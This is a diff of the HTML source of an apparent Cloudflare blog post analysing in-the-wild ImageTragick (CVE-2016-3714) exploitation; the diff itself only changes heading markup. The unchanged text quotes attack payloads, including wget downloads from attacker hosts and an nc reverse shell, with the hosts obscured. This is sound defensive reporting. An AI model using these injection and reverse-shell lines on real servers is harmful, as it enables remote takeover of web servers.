@@ -10,7 +10,14 @@
 	<p>Many websites allow users to upload images and the websites themselves often manipulate these images using software like ImageMagick. For example, if you upload a picture of yourself to use as an avatar, it will very likely be resized by the website. ImageMagick is very popular and there are plugins that make it easy to use with PHP, Ruby, Node.js and other languages so it is common for websites to use it for image resizing or cropping.</p>
 	<p>Unfortunately, researchers discovered that it was possible to execute arbitrary code (<a href="https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-3714">CVE-2016-3714</a>) by hiding it inside image files that a user uploads. That means an attacker can make a web server do its bidding by uploading an image containing code the attacker chooses.</p>
 	<p>As ever, it is critical that users of ImageMagick <a href="https://www.imagemagick.org/script/changelog.php">upgrade</a> as quickly as possible to be fully protected.</p>
-	<h3>Shellshock 2?</h3>
+	<div class="flex anchor relative">
+		<h3 id="shellshock-2">Shellshock 2?</h3>
+		<a href="https://blog.cloudflare.com/#shellshock-2" aria-hidden="true" class="relative sm:absolute sm:-left-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
 	<p>Back in 2014 I wrote about another nasty code execution vulnerability called <a href="https://blog.cloudflare.com/inside-shellshock">Shellshock</a>. In that blog post I wrote:</p>
 	<p><i>The Shellshock problem is an example of an </i><a href="https://en.wikipedia.org/wiki/Arbitrary_code_execution"><i>arbitrary code execution</i></a><i> (ACE) vulnerability. Typically, ACE vulnerability attacks are executed on programs that are running, and require a highly sophisticated understanding of the internals of code execution, memory layout, and assembly language—in short, this type of attack requires an expert.</i></p>
 	<figure class="kg-card kg-image-card ">
@@ -21,7 +28,14 @@
 	<p><i>Attacker will also use an ACE vulnerability to upload or run a program that gives them a simple way of controlling the targeted machine. This is often achieved by running a "shell". A shell is a command-line where commands can be entered and executed.</i></p>
 	<p><i>The Shellshock vulnerability is a major problem because it removes the need for specialized knowledge, and provides a simple (unfortunately, very simple) way of taking control of another computer (such as a web server) and making it run code.</i></p>
 	<p>Sadly, the same is true of ImageTragick: attackers do not need to be sophisticated to take advantage of it and run arbitrary code on a vulnerable web server. Shellshock was especially nasty because of how widespread the vulnerability was; ImageTragick is less widespread but a real problem for sites that use it to manipulate images that users upload.</p>
-	<h3>Reconnaissance</h3>
+	<div class="flex anchor relative">
+		<h3 id="reconnaissance">Reconnaissance</h3>
+		<a href="https://blog.cloudflare.com/#reconnaissance" aria-hidden="true" class="relative sm:absolute sm:-left-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
 	<p>We began watching the exploitation of CVE-2016-3714 as soon as the WAF rule went live across our network. The bad news is that this vulnerability is being actively used by hackers to attack websites.</p>
 	<p>I’ve gathered examples of the most popular payloads being used by hackers. These are not weaponized as I have removed the image wrapping from around the payloads to ensure that they cannot simply be copied and pasted to perform an attack. I have also obscured IP addresses and website names used by attackers.</p>
 	<figure class="kg-card kg-image-card ">
@@ -38,7 +52,14 @@ someting_by_nebezial-d5cdlor.jpg";curl "example.com)'</code></pre>
 	<pre class="language-bash"><code class="language-bash">&lt;image xlink:href="https://127.0.0.1/image.jpg"|wget xx.xx.116.214/loltest;" 
 x="0" y="0" height="140px" width="140px"/&gt;</code></pre>
 	<p>The wget command results in a 404 Not Found error (although there might have been a real file downloaded at some point). Even with a 404 error an attacker can look through their own server logs (of the server at xx.xx.116.214) to discover the IP address of any website on which the payload worked. They can then return to the website later to attack it properly.</p>
-	<h3>Remote Access</h3>
+	<div class="flex anchor relative">
+		<h3 id="remote-access">Remote Access</h3>
+		<a href="https://blog.cloudflare.com/#remote-access" aria-hidden="true" class="relative sm:absolute sm:-left-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
 	<p>Another style of payload looks like this:</p>
 	<pre class="language-bash"><code class="language-bash">fill 'url(https://127.0.0.0/sdfsdf.jpg"|wget -o- a0074942.example.com/dfgdfg &gt;
 "/tmp/dfgfdgfdg)'</code></pre>
@@ -102,7 +123,14 @@ fill 'url(https://profile-photos.example.com/production/000/003/658/b4eb8_
 xtralarge.png"|nc -e /bin/sh xx.xx.151.208</code></pre>
 	<p>The first uses <a href="http://linux.die.net/man/1/setsid">setsid</a> to create a new session and then hooks up the bash shell to a TCP connection back to the hacker’s server. The second uses <a href="http://linux.die.net/man/1/nc">nc</a> to attempt the same thing.</p>
 	<p>All these payloads are designed to give the hacker unfettered access to the vulnerable web server. With a single exploit they can get remote access and then proceed to further hack the vulnerable web server at their leisure.</p>
-	<h3>Conclusion</h3>
+	<div class="flex anchor relative">
+		<h3 id="conclusion">Conclusion</h3>
+		<a href="https://blog.cloudflare.com/#conclusion" aria-hidden="true" class="relative sm:absolute sm:-left-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
 	<p>CloudFlare continually updates our WAF as vulnerabilities are found and customers get automatic protection. Nevertheless, we urge all users of ImageMagick to upgrade as quickly as possible.</p>
 	<p>At the current time we do not know of a website that has been successfully hacked using ImageTragick, but it is clear that hackers are actively trying this vulnerability as it is fresh and many servers are likely to not have been patched yet.</p>
 	<p>If you are interested in understanding the vulnerability in more detail, the researchers have a set of non-weaponized <a href="https://github.com/ImageTragick/PoCs">PoCs</a> available and a program for testing whether an installed version of ImageMagick on your own server is vulnerable. They also have a <a href="https://imagetragick.com/#info">detailed description</a> of the underlying problem.</p>
